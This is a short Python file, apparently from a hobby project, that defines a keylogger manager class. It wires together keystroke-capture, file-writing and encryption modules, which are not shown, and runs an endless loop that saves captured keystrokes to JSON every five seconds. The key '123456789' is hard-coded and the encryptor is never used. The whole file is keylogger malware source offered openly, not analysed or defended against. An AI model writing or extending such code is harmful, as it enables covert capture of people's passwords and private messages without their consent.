from keyloggerservise import KeyloggerService
from file_writer import FileWriter
from encrypto import Encrypt
import time

class KeyloggerManeger:
    def __init__(self, key):

        self.keylogger = KeyloggerService()
        self.file_writer = FileWriter()
        self.encrypt = Encrypt(key)
        self.f()

   # keylogger.getData()

    def getdata(self):

        self.file_writer.save_to_json(self.keylogger.data)

    def f(self):
        while True:
            time.sleep(5)
            self.getdata()








    def exit(self):
        pass

maneger = KeyloggerManeger("123456789")


